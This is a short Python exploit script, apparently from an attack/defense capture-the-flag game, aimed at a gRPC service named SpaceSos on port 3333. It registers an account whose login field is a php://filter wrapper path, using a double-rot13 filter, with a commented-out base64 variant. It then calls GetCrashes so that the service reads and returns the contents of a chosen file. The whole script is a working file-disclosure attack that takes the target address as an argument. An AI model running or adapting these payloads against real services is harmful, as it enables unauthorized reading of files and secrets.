#!/usr/bin/env python3
import secrets

import grpc
import sys
import random
import spacesos_pb2_grpc
import spacesos_pb2

ip = sys.argv[1]
hint = sys.argv[2]

chan = grpc.insecure_channel('{}:3333'.format(ip))
stub = spacesos_pb2_grpc.SpaceSosStub(chan)

u = hint

# First payload. Read error.
# payload = "php://filter{}/convert.base64-encode/resource={}".format('/' * random.randint(1, 30), u)
# print(payload)
# sessionId = stub.Register(spacesos_pb2.AuthRequest(login=payload, password='somepassword'))
# req = spacesos_pb2.CrashRequest(sessionId=sessionId.sessionId)
# try:
#     resp = stub.GetCrashes(req)
# except grpc.RpcError as e:
#     print(e.details())

# Cool payload with two rot13 :)
payload = "php://filter{}/read=string.rot13/read=string.rot13/resource={}".format('/' * random.randint(1, 30), u)
sessionId = stub.Register(spacesos_pb2.AuthRequest(login=payload, password='somepassword'))
req = spacesos_pb2.CrashRequest(sessionId=sessionId.sessionId)
resp = stub.GetCrashes(req)
print(resp)